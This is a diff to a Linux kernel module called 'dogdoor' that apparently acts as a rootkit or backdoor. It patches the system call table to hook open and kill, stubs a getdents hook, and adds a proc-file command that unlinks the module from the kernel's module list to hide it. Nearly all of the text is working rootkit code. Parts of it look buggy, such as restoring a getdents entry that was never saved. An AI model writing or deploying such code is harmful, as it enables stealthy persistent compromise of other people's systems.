@@ -9,6 +9,7 @@
 #include <asm/unistd.h>
 #include <linux/cred.h>
 #include <linux/fs.h>
+#include <linux/list.h>
 
 MODULE_LICENSE("GPL");
 
@@ -22,9 +23,14 @@ char fname_list[10][256];
 int fname_count = 0;
 int prog_num = 0;
 char message[256];
+struct list_head this;
+struct list_head *prev;
+struct list_head *next;
+bool hidden = false;
 
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode);
 asmlinkage long (*orig_sys_kill)(pid_t pid, int sig);
+asmlinkage long (*orig_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 
 asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode) {
 	char fname[256];
@@ -72,6 +78,10 @@ asmlinkage long dogdoor_sys_kill(pid_t pid, int sig){
 	return orig_sys_kill(pid, sig);
 }
 
+asmlinkage long dogdoor_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
+	return orig_sys_getdents(fd, dirent, count);
+}
+
 static int dogdoor_proc_open(struct inode *inode, struct file *file) {
 	return 0;
 }
@@ -117,6 +127,17 @@ static ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, si
 	else if (prog_num == 2) {
 		target_pid = target_id;
 	}
+	else if (prog_num == 3) {
+		if (hidden) {
+			__list_add(&this, prev, next);
+			printk("******* Not Hidden!! *******");
+			hidden = false;
+		} else {
+			__list_del(prev, next);
+			printk("******* Hidden!!! ********");
+			hidden = true;
+		}
+	}
 	
 	count = 0;
 	*offset = strlen(buf);
@@ -143,13 +164,18 @@ static int __init dogdoor_init(void) {
 
 	orig_sys_open = sctable[__NR_open];
 	orig_sys_kill = sctable[__NR_kill];
+	//orig_sys_getdents = sctable[__NR_getdents];
 	pte = lookup_address((unsigned long) sctable, &level);
 	if (pte->pte &~ _PAGE_RW)
 		pte->pte |= _PAGE_RW;
 	sctable[__NR_open] = dogdoor_sys_open;
 	sctable[__NR_kill] = dogdoor_sys_kill;
+	//sctable[__NR_getdents] = dogdoor_sys_getdents;
 
 	//target_uid.val = 1001;
+	this = THIS_MODULE->list;
+	next = (&this)->next;
+	prev = (&this)->prev;
 
 	return 0;
 }
@@ -161,6 +187,7 @@ static void __exit dogdoor_exit(void) {
 
 	sctable[__NR_open] = orig_sys_open;
 	sctable[__NR_kill] = orig_sys_kill;
+	sctable[__NR_getdents] = orig_sys_getdents;
 	pte = lookup_address((unsigned long) sctable, &level);
 	pte->pte = pte->pte &~ _PAGE_RW;
 }
